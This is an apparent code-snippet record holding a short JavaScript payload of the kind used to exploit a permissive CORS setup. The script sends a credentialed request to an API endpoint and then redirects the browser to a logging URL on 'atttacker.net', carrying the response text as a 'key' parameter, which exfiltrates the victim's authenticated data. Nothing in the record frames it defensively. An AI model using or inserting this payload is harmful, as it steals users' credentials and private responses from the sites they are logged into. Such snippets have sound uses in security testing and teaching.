---
id: 20aec43a-6f9f-434d-9c95-3cbef86396cc
type: code
language: js
verified: false
created_at: '2023-04-06T03:55:55.966539+00:00'
updated_at: '2023-04-10T20:21:23.337338+00:00'
---

# Code Snippet 20aec43a

**Language**: js

```js
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://api.example.com/endpoint',true); 
req.withCredentials = true;
req.send();

function reqListener() {
    location='//atttacker.net/log?key='+this.responseText; 
};
```


